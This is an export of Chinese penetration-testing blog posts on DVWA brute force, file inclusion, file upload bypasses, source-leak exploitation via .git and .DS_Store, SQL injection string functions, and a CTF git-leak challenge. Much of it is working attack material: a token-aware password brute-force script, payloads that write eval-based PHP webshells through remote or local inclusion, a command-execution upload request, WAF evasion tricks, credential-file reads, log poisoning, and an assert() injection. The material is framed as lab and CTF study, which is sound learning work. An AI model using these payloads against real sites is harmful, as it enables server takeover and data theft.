Anti-CSRF token generateSessionToken(); ?&gt; High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。 每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。 漏洞利用由于加入了Anti-CSRFtoken预防无脑爆破，这里就不推荐用Burpsuite了，还是简单用python写个脚本吧。下面是我找的的一个脚本（python 2.7），用户名为admin，对password参数进行爆破并打印结果，仅供各位参考。 from bs4 import BeautifulSoup import urllib2 header={ &#39;Host&#39;: &#39;192.168.153.130&#39;, &#39;Cache-Control&#39;: &#39;max-age=0&#39;, &#39;If-None-Match&#39;: &quot;307-52156c6a290c0&quot;, &#39;If-Modified-Since&#39;: &#39;Mon, 05 Oct 2015 07:51:07 GMT&#39;, &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&#39;, &#39;Accept&#39;: &#39;*/*&#39;, &#39;Referer&#39;: &#39;http://192.168.153.130/dvwa/vulnerabilities/brute/index.php&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate, sdch&#39;, &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8&#39;, &#39;Cookie&#39;: &#39;security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2&#39;} requrl = &quot;http://192.168.153.130/dvwa/vulnerabilities/brute/&quot; def get_token(requrl,header): req = urllib2.Request(url=requrl,headers=header) response = urllib2.urlopen(req) print response.getcode(), the_page = response.read() print len(the_page) soup = BeautifulSoup(the_page,&quot;html.parser&quot;) user_token = soup.form.input.input.input.input[&quot;value&quot;] #get the user_token return user_token user_token = get_token(requrl,header) i=0 for line in open(&quot;rkolin.txt&quot;): requrl = &quot;http://192.168.153.130/dvwa/vulnerabilities/brute/&quot;+&quot;?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i = i+1 print i,&#39;admin&#39;,line.strip(), user_token = get_token(requrl,header) if (i == 10): break get_token的功能是通过python的BeautifulSoup库从html页面中抓取user_token的值，为了方便展示，这里设置只尝试10次。 Impossible核心代码&lt;?php if( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_POST[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_POST[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) ) { // User locked out. Note, using this method would allow for user enumeration! //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; // Calculate when the user would be allowed to login again $last_login = strtotime( $row[ &#39;last_login&#39; ] ); $timeout = $last_login + ($lockout_time * 60); $timenow = time(); /* print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;; print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;; print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;; */ // Check to see if enough time has passed, if it hasn&#39;t locked the account if( $timenow &lt; $timeout ) { $account_locked = true; // print &quot;The account is locked&lt;br /&gt;&quot;; } } // Check the database (if username matches the password) $data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR); $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) { // Get users details $avatar = $row[ &#39;avatar&#39; ]; $failed_login = $row[ &#39;failed_login&#39; ]; $last_login = $row[ &#39;last_login&#39; ]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) { echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;; } // Reset bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } else { // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; // Update bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Set the last login time $data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。 关于PDO：http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含]]></title>
    <url>%2F2019%2F04%2F08%2Fwen-jian-bao-han%2F</url>
    <content type="text"><![CDATA[前言文件包含漏洞是渗透测试过程中用得比较多的一个漏洞，最近做了ctf的比赛，发现文件包含自己还是不会。。。。。好吧，学习一下，在此记录一下。 特殊姿势利用phar://协议特性可以在渗透过程中帮我们绕过一些waf检测，phar:// 数据流包装器自 PHP 5.3.0 起开始有效，貌似可以绕过安全狗。 利用过程 新建shell.php： &lt;?php include &#39;phar://test.rar/test.txt&#39;; ?&gt; 新建test.txt: &lt;?php phpinfo(); ?&gt; 压缩test.txt文件，可以重命名压缩文件为zip,phar,rar等格式，之后访问shell.php文件后，会出现phpinfo内容。 php文件包含漏洞PHP中的文件包含分为本地包含与远程包含，导致文件包含的函数如下： include() include_once() require() require_once() fopen() readfile() …… 本地包含漏洞(LFI)新建一个phpinfo.txt，然后新建一个shell.php: &lt;?php include(&quot;phpinfo.txt&quot;); ?&gt; 访问shell.php会输出phpinfo页面内容，无论将扩展名改为什么，都将以php代码执行。如果文件不是符合php规则的（即没有写&lt;?php ?&gt;等），则通过include可以直接输出源码。 远程包含漏洞前提：需要开启allow_url_fopen，默认关闭。新建php.txt: &lt;?php echo &quot;Hello World!; ?&gt; 新建index.php &lt;?php include($_GET[&#39;page&#39;]); ?&gt; 访问http://www.xxxx.com/page=http://www.xxxx.com/php.txt执行结果将输出hello world。 漏洞利用读取敏感信息如：http://www.xxx.com/index.php?page=/etc/passwdWindows： C:\boot.ini C:\windows\system32\inetsrv\MetaBase.xml C:\windows\repair\sam C:\windows\php.ini php配置文件 C:\windows\my.ini mysql配置文件 Linux： /etc/passwd /usr/local/app/apache2/conf/http.conf /usr/local/app/php5/lib/php.ini PHP相关设置 /etc/httpd/conf/http.conf apache配置文件 /etc/my.cnf mysql配置文件 远程包含shelltest.txt文件，可以保存在远程服务器上，内容如下： &lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[nmask]);?&gt; 如果目标网站存在远程包含漏洞，则可以通过访问：http://www.xxx1.com/index.php?page=http://www.xx2.com/test.txt则会在服务器根目录下生产一个`shell.php`内容为: &lt;?php eval($_POS[nmask]);?&gt; 本地包含配合文件上传如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传上传一个图片木马a.jpg，内容为： &lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[tzc]);?&gt;&quot;)?&gt; 访问URL：http://www.xxx.com/index.php?page=./a.jpg在本地生成shell.php。 本地包含配合apache日志拿shellapache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，便会将这个页面写入access.log中。如访问URL:http://www.xxx.com/&lt;?php eval([$_POST]);?&gt;则会将一句话写入到access.log中，但是一般来说，写入到access.log文件中的一句话是被编码的，所以需要抓包绕过，而且利用此漏洞需要知道access.log的地址，不然便没有。 利用/proc/self/environ进行包含如：http://www.test.com/view.php?page=../../../../proc/self/environ这是web进程运行时的环境变量，其中有些参数是可以被用户控制的，最常见做法就是在User-Agent中插入一句话。 利用php协议进行包含 data: php5.2以后版本 php://input 需要开启allow_url_include poc: http://www.test.com/index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;%00 截断包含有些开发者为了防止本地包含漏洞，会编写一下代码: &lt;?php include $_GET[&#39;page&#39;].&quot;.php&quot; ?&gt; 00截断包含新建1.jpg： &lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[tzc]);?&gt;&quot;)?&gt; 这样的话比如上传一个1.jpg图片码，则访问http://www.xxx.com/1.jpg时，访问的是1.jgp.php，以为没有这个文件所以报错。这时，可以尝试访问http://www.xxx.com/1.jpg%00 长目录截断 ././././././././././././././etc/passwd 或者 ////////////////////////////etc/passwd 或者 ../a/etc/passwd/../a/etc/passwd/../a/etc/passwd 在windows下目录最大长度为256字节，linux下为4096字节，其后面超出部分被丢弃。 漏洞修复开启open_basedir函数，将其设置为指定目录，则只有该目录的文件允许被访问。关闭allow_url_include函数，防止远程文件包含。 jsp文件包含漏洞 include &lt;%@ include file=&quot;head.jsp&quot;%&gt; &lt;%@ include file=&quot;body.jsp&quot;%&gt; &lt;%@ include file=&quot;tail.jsp&quot;%&gt; jsp:include&lt;jsp:include page=&quot;head.jsp&quot;/&gt; &lt;jsp:include page=&quot;body.jsp&quot;/&gt; &lt;jsp:include page=&quot;tail.jsp”/&gt; 采用JSTL&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt; 说明:(1)include指令在转换时插入“Header.jsp”的源代码，而标准动作在运行时插入“Header.jsp”的响应。元素允许你包含动态文件和静态，而include说明标签仅仅是把一个文件内容当成静态追加到主文件中去。(2)采用前两种方式，只能包含当前web应用的界面，不过c:import可以包含容器之外的内容。 asp文件包含漏洞asp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下： &lt;!--#include file=&quot;1.asp&quot; --&gt; aspx文件包含漏洞aspx文件包含与asp一样，语法如下： &lt;!--#include file=&quot;top.aspx&quot; --&gt;]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传(二)之实战篇]]></title>
    <url>%2F2019%2F04%2F08%2Fwen-jian-shang-chuan-er-zhi-shi-zhan-pian%2F</url>
    <content type="text"><![CDATA[前言最近打了场XCTF，看到同学在群里交流，自己不自觉留下来没有技术的泪水。。。好吧，那就开始学吧。。。在网上找到一个不错的上传漏洞汇总的靶场，在本地搭建好环境，开始闭关。。。。。。 靶场源码地址：github.com/c0ny1/upload-labs 我下载的是靶主已经集成配置好的环境进行本地搭建。 地址：github.com/c0ny1/upload-labs/releases Pass-01上传一个2.php文件查看提示： 查看源码： function checkFile() { var file = document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; } } 发现只允许上传.jpg|.png|.gif类型的文件 未完。。。。。。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件泄露漏洞]]></title>
    <url>%2F2019%2F04%2F08%2Fwen-jian-xie-lu-lou-dong%2F</url>
    <content type="text"><![CDATA[前言前两天刚做了一道.git文件泄露的题，在网上查了些资料，发现还有其他的文件泄露漏洞，现在来总结一下。 文件泄露GitHub导致文件泄露###漏洞成因及危害在Github中被泄露的敏感信息主要包括以下几类： 邮箱信息 SVN信息 内部账号及密码 数据库连接信息 服务器配置信息 这些敏感信息有的只是导致一些无法被外网连接的内网账户信息或者数据库连接信息泄露，但时也可能会导致公司重要的商业秘密或程序源代码被他人窃取，管理员账户被控制或者数据库泄露等，造成巨大的损失。 ###漏洞检测及利用site:Github.com smtpgoogle hacker语法 git导致文件泄露漏洞成因在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 利用方法方法一：下载.git文件： wget --mirror --include-directories=/.git http://www.target.com/.gitcd www.target.com 代码重构： git reset --hard 方法二：Python2 GitHack.py http://www.xxx.com/.git/ GitHack.py下载地址：https://github.com/lijiejie/GitHack svn导致文件泄露Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。 工具下载：https://github.com/lijiejie/ds_store_exp DS_Store导致文件泄露漏洞成因在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 漏洞利用下载地址：https://github.com/lijiejie/ds_store_exp 使用：ds_store_exp.py http://www.xxx.com/.DS_Store 网站备份压缩文件在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。 漏洞成因及危害：该漏洞的成因主要有以下两种：服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。 漏洞检测：该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。.rar、.zip、.7z、.tar.gz、.bak、.swp、.txt、.html]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传(一)之绕过姿势]]></title>
    <url>%2F2019%2F04%2F06%2Fwen-jian-shang-chuan-yi-zhi-rao-guo-zi-shi%2F</url>
    <content type="text"><![CDATA[前言文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势。 文件上传校验姿势客户端JavaScript校验（一般只校验后缀名）一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。 服务端校验content-type字段校验这里以PHP代码为例，模拟web服务器端的校验代码 &lt;?php if($_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;) #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。 { echo &quot;Sorry, we only allow uploading GIF images&quot;; exit; } $uploaddir = &#39;uploads/&#39;; $uploadfile = $uploaddir . basename($_FILES[&#39;userfile&#39;][&#39;name&#39;]); if (move_uploaded_file($_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;], $uploadfile)) { echo &quot;File is valid, and was successfully uploaded.\n&quot;; } else { echo &quot;File uploading failed.\n&quot;; } ?&gt; 可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。 文件头校验可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：（1） .JPEG;.JPE;.JPG，”JPGGraphic File”（2） .gif，”GIF 89A”（3） .zip，”Zip Compressed”（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” 文件上传绕过校验姿势客户端绕过可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。 服务端绕过文件类型绕过我们可以通过抓包，将content-type字段改为image/gif POST /upload.php HTTP/1.1 TE: deflate,gzip;q=0.3 Connection: TE, close Host: localhost User-Agent: libwww-perl/5.803 Content-Type: multipart/form-data; boundary=xYzZY Content-Length: 155 --xYzZY Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;shell.php&quot; Content-Type: image/gif (原为 Content-Type: text/plain) &lt;?php system($_GET[&#39;command&#39;]);?&gt; --xYzZY- 文件头绕过在木马内容基础上再加了一些文件信息，有点像下面的结构GIF89a&lt;?php phpinfo(); ?&gt; 文件后缀名绕过前提：黑名单校验黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。绕过方法：（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类能被解析的文件扩展名列表：jsp jspx jspfasp asa cer aspxphp php php3 php4exe exee 配合文件包含漏洞前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法： #PHP &lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; #ASP &lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt; #JSP &lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt; or &lt;%@include file=&quot;上传的txt文件路径&quot;%&gt; 配合服务器解析漏洞看这篇博客 配合操作系统文件命令规则 上传不符合windows文件命名规则的文件名 test.asp. test.asp(空格) test.php:1.jpg test.php::$DATA shell.php::$DATA……. 会被windows系统自动去掉不符合规则符号后面的内容。 linux下后缀名大小写在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。 CMS、编辑器漏洞 CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。 编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。 参考以下链接： https://www.leavesongs.com/PENETRATION/UseOfFckeditor.html http://shack2.org/article/183.html http://www.cnbraid.com/2015/fckeditor.htmlhttps://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1 配合其他规则 0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候 test.php(0x00).jpg test.php%00.jpg 路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg 伪代码演示： name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00) type =gettype(name) //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg if(type == jpg) SaveFileToPath(UploadPath.name, name) //但在这里却是以 0x00 作为文件名截断 //最后以 help.asp 存入路径里 .htaccesss上传当前目录的.htaccess 文件例如内容为： AddType application/x-http-php .jpg (上传的jpg 均以php执行)把.htaccess 上传后，且上传成功后，再上传内容为一句话的jpg文件 WAF绕过垃圾数据有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验； 当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。 可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。 filename针对早期版本安全狗，可以多加一个filename。 或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方： POST/GET有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET。 利用waf本身缺陷删除实体里面的Conten-Type字段 第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。 正常包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png 构造包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png C.php&quot; 删除Content-Disposition字段里的空格]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手工注入之常见字符串函数]]></title>
    <url>%2F2019%2F04%2F04%2Fshou-gong-zhu-ru-zhi-chang-jian-zi-fu-chuan-han-shu%2F</url>
    <content type="text"><![CDATA[前言前两天整理了一下关于手工注入的方法，今天来说一说手工注入的几个字符串函数。在手工注入中常常需要一次查询多个结果，这里字符串函数就派上用场了。 手工注入字符串常用函数三个老朋友: concat() group_concat() concat_ws() concat基本格式CONCAT(str1,str2) 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。可以有一个或多个参数。 使用案例 参数中有NULL mysql&gt; SELECT CONCAT(id,&#39;,&#39;,NULL,&#39;,&#39;,password) AS users FROM users LIMIT 1,1; +-------+ | users | +-------+ | NULL | +-------+ 1 row in set (0.00 sec) 使用LIMIT来控制结果数量 mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users; +-----------------------+ | users | +-----------------------+ | 1,Dumb,Dumb | | 2,Angelina,I-kill-you | | 3,Dummy,p@ssword | | 4,secure,crappy | | 5,stupid,stupidity | | 6,superman,genious | | 7,batman,mob!le | | 8,admin,admin | | 9,admin1,admin1 | | 10,admin2,admin2 | | 11,admin3,admin3 | | 12,dhakkan,dumbo | | 14,admin4,admin4 | +-----------------------+ 13 rows in set (0.00 sec) mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users LIMIT 1; +-------------+ | users | +-------------+ | 1,Dumb,Dumb | +-------------+ 1 row in set (0.00 sec) mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users LIMIT 2; +-----------------------+ | users | +-----------------------+ | 1,Dumb,Dumb | | 2,Angelina,I-kill-you | +-----------------------+ 2 rows in set (0.00 sec) mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users LIMIT 0,1; +-------------+ | users | +-------------+ | 1,Dumb,Dumb | +-------------+ 1 row in set (0.00 sec) mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users LIMIT 0,2; +-----------------------+ | users | +-----------------------+ | 1,Dumb,Dumb | | 2,Angelina,I-kill-you | +-----------------------+ 2 rows in set (0.00 sec) mysql&gt; SELECT CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,password) AS users FROM users LIMIT 1,1; +-----------------------+ | users | +-----------------------+ | 2,Angelina,I-kill-you | +-----------------------+ 1 row in set (0.00 sec) CONCAT_WSCONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。感觉比CONCAT更方便了呀，这样参数多的话就不用手动的去添加分隔符了。 基本格式CONCAT_WS(separator,str1,str2,…) 使用案例mysql&gt; SELECT CONCAT_WS(&#39;~&#39;,id,username,password) AS users FROM users LIMIT 0,2; +-----------------------+ | users | +-----------------------+ | 1~Dumb~Dumb | | 2~Angelina~I-kill-you | +-----------------------+ 2 rows in set (0.00 sec) GROUP_CONCATGROUP_CONCAT函数返回一个字符串结果，默认查询所有结果。该结果由分组中的值连接组合而成。 基本格式GROUP_CONCAT(str1,str2,…) 使用案例mysql&gt; SELECT GROUP_CONCAT(id,username,password) AS users FROM users; +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | users | +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | 1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4 | +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 1 row in set (0.00 sec) sql注入中一般使用方法 列出所有的数据库 select group_concat(schema_name) from information_schema.schemata 列出某个库当中所有的表 select group_concat(table_name) from information_schema.tables where table_schema=&#39;xxxxx&#39;]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git泄露]]></title>
    <url>%2F2019%2F04%2F04%2Fgit-xie-lu%2F</url>
    <content type="text"><![CDATA[前言最近在做ctf的题，碰到了GitHack，刚好大佬学长有一道这方面的题，拿来练练手。现在总结一下。 题目链接：http://web.jarvisoj.com:32798/分析既然知道是git泄露了，那就废话少说，抄家伙！！！下载GitHack： git clone https://github.com/lijiejie/GitHack 执行GitHack： python GitHack.py http://web.jarvisoj.com:32798/.git/ index.php核心代码： &lt;?php if (isset($_GET[&#39;page&#39;])) { $page = $_GET[&#39;page&#39;]; } else { $page = &quot;home&quot;; } $file = &quot;templates/&quot; . $page . &quot;.php&quot;; assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;); assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;); ?&gt; 分析代码可以看到： 需要传个page参数 file = &quot;templates/&quot;.$page.&quot;.php&quot; 通过assert函数进行了两次友好（）的判断回显，如果不符合假定，就执行or后面的语句 bool assert(mixed $assertion[,string $description])，如果assertion是字符串，他会被assert()当做php代码执行。会执行！！！ 解决方法思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。 &#39;) or phpinfo();# ——即变成file_exists(&#39;&#39;) or phpinfo();# ，结果为执行phpinfo()，注意要url编码，本处为了方便阅读，以编码前显示 &#39;) or print_r(file_get_contents(&#39;templates/flag.php&#39;);# ——然后在源代码里（临门一脚不要被坑了） 即构造payload1: 